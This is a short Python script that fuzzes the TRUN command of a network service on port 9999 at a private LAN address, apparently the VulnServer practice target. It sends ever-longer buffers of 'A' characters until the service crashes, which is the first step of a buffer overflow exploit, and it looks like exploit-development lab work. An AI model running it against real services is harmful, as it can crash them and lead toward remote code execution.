#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('192.168.0.234', 9999))
        s.send(('TRUN /.:/' + buffer).encode())
        s.settimeout(None)
        s.close()
        sleep(1)
        buffer = buffer + ("A" * 100)
    except Exception as ex:
        print(ex)
        lengthBuffer = len(buffer)
        print("Fuzzing crashed at {} bytes".format(lengthBuffer))
        sys.exit()
